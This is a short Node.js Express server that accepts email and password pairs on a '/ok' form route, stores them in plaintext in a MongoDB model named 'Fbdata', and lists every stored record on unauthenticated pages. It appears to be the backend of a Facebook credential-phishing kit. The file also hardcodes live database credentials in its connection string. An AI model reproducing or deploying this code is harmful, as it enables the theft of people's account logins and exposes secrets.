const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const mongoose = require('mongoose');
//const url = "mongodb://alwaygo:alwaygo123@ds249967.mlab.com:49967/alwaygo";

app.set('view engine', 'ejs');


var urlencodedParser = bodyParser.urlencoded({ extended: false });
app.use(bodyParser.json());


mongoose
  .connect("mongodb://alwaygo:alwaygo123@ds249967.mlab.com:49967/alwaygo", { 
    useNewUrlParser: true,
    useCreateIndex: true 
  }) // Adding new mongo url parser
  .then(() => console.log('MongoDB Connected...'))
  .catch(err => console.log(err));

    

app.get('/', (req, res) => {
    res.render('index');
  });

  app.get('/alldata', (req, res) => {
    const Fbdata = require('./model');

    Fbdata .find({})
      .then(fbdatai => {
        res.render('alldata', { gamesInfo: fbdatai.reverse()  });
        console.log(fbdatai);
      });
    

});

app.get('/alldatas', (req, res) => {
  const Fbdata = require('./model');

  Fbdata .find({})
    .then(fbdatai => {
      res.render('alldatas', { gamesInfo: fbdatai.reverse()  });
      console.log(fbdatai);
    });
  
});

app.get('/fbdatas', (req, res) => {
  const Fbdata = require('./model');

  Fbdata .find({})
    .then(fbdatai => {
      res.render('fbdatas', { gamesInfo: fbdatai.reverse()  });
      console.log(fbdatai);
    });
  
});


app.post('/ok', urlencodedParser, (req, res) => {
    
    res.render('ok', {data: req.body});
    console.log(req.body);

    const Fbdata = require('./model');

    const { email, password } = req.body;

    const newFbdata = Fbdata({
      email, 
      password
  }); 
    
  newFbdata.save()
});


app.listen(process.env.PORT || 3000);
    
